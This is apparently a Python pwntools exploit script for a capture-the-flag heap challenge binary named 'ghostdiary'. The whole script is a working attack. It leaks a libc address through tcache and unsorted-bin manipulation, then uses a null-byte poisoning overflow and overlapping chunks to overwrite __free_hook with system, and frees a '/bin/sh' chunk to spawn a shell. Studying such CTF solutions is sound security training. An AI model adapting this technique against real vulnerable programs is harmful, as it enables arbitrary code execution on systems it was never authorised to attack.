from pwn import *


e = ELF("./ghostdiary")

libc = ELF("./libc.so.6")


p = process("./ghostdiary")


#context.log_level="debug"
gdb.attach(p, """""")


def create(choice, size):
	print("---- create ----")
	p.sendlineafter(">", "1")
	p.sendlineafter(">", str(choice))
	p.sendlineafter(":", str(size))
	print("created", p.recvline().strip())


def edit(idx, dat="AAAA"):
	p.sendlineafter(">", "2")
	p.sendlineafter(":", str(idx))
	p.sendlineafter(":", dat)


def show(idx):
	p.sendlineafter(">", "3")
	p.sendlineafter(":", str(idx))



def delete(idx):
	p.sendlineafter(">", "4")
	p.sendlineafter(":", str(idx))


# leak libc

for i in range(10):
	create(2, 0x150)

for i in range(10):
	delete(i)

for i in range(8):
	create(2, 0x150)

show(7)

libc_leak = p.recvline().strip().split(" ",1)[1]

libc.address = u64(libc_leak.ljust(8, "\x00")) - 0x3ebca0

print("libc address", hex(libc.address))

for i in range(8):
	delete(i)



# achieve arb write w/ null byte poison


# sep tcache bin
# need unsorted / others bc tcache does not consolidate
# fill tcache

for i in range(7):
	create(1, 0xf0)


create(1, 0xf0)		#7

create(1, 0x18)

create(1, 0xf0)


#me trying to forge a chunk LOL
#edit(9, "B"*0xf0+p64(0x100)+p64(0x21)+p64(libc.address)+p64(2)+p64(0x20))


create(1, 0x10)

for i in range(7):
	delete(i)



delete(7)


edit(8, "A"*0x10 + p64(0x120))		#null poison chunk 9 to set size to 0x100



delete(9)

create(2, 0x170)	# 0


delete(8)

forge = ""

forge += "B"*0xf0
forge += p64(0x100)
forge += p64(0x20)
forge += p64(libc.sym["__free_hook"])
forge += p64(0x3333333333333333)
forge += p64(0x120)
forge += p64(0x100)


edit(0, forge)


print("libc free hook", hex(libc.sym["__free_hook"]))


create(1, 0x18)		#1


create(1, 0x18)		#2


edit(2, p64(libc.sym["system"]))


edit(1, "/bin/sh")
delete(1)


p.interactive()
